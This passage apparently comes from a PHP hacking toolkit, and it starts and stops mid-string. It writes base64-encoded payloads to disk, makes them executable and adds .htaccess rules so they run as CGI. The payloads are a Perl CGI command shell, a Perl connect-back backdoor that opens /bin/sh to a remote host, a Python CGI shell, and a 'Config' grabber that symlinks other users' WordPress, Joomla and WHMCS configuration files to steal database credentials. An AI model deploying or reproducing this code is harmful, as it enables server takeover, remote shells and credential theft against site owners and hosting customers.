hcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
echo "http://cgishell/izo.cin ";
}
if (isset($_POST['Submit14']))
{
    mkdir('python', 0755);
    chdir('python');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("python.izo",0755);
   echo "http://python/python.izo ";
}
if (isset($_POST['Submit11']))
{
    mkdir('configler', 0755);
    chdir('configler');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5bfl0gQ3liM3ItRFogQ29uZmlnIC0gW35dIDwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IFRhaG9tYTsNCiBmb250LXNpemU6IHgtc21hbGw7DQogZm9udC13ZWlnaHQ6IGJvbGQ7DQogY29sb3I6ICMwMEZGRkY7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywka29sYS4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRrb2xhLictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1tZW1iZXJzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLicyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictZm9ydW0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLic1LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLic0LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AxMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLic2LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nNy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJGtvbGEuJzgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRrb2xhLic5LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJzEyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy12Yi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWluY2x1ZGVzLXZiLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0xNS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobWMxNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicxd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJy13aG1jczIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnRzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmcudHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictYmlsbGluZy50eHQnKTsgDQp9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkN5YjNyLWR6IENvbmZpZyBGdWNrIFNjcmlwdDwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBDb2RlZCBCeSBDeWIzci1EWiA8Zm9udCBjb2xvcj0iI0MwQzBDMCI+fDwvZm9udD4gDQreYSBATy4gZskcZS8g3mE8c3BhbiBpZD0icmVzdWx0X2JveCIgY2xhc3M9InNob3J0X3RleHQiIGxhbmc9ImVuIj48c3BhbiBzdHlsZSB0aXRsZT4NCjxmb250IGNvbG9yPSIjQzBDMEMwIj58PC9mb250Pjwvc3Bhbj48L3NwYW4+IDxhIGhyZWY9Imh0dHA6Ly93d3cud3d3LnNlYzRldmVyLmNvbSI+DQo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+d3d3LnNlYzRldmVyLmNvbTwvZm9udD48L3NwYW4+PC9hPiANCjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PjwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkYiICA+PC90ZXh0YXJlYT48YnIgLz4NCiZuYnNwOzxwPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkY7ICIgIC8+PGJyIC8+DQombmJzcDs8L3A+DQo8cD4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHZXQgQ29uZmlnIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojMDBGRkZGOyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwvcD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5lczsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxpbmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5Eb25lICEhPC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEh